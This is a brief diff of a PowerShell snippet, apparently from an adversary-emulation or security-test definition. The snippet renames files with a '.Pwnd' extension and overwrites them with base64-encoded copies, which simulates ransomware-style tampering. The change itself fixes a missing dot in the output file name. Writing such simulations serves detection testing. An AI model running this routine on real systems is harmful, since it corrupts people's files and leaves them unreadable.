@@ -8,7 +8,7 @@
             Rename-Item -Path $f.fullname -NewName ($f.fullname + ".Pwnd");
             $bytes = [IO.file]::ReadAllBytes($f.FullName+".Pwnd");
             $b64converted = [System.convert]::ToBase64String($bytes);
-            [IO.file]::WriteAllText($f.FullName+"Pwnd", $b64converted);
+            [IO.file]::WriteAllText($f.FullName+".Pwnd", $b64converted);
         }
         '
     code: null
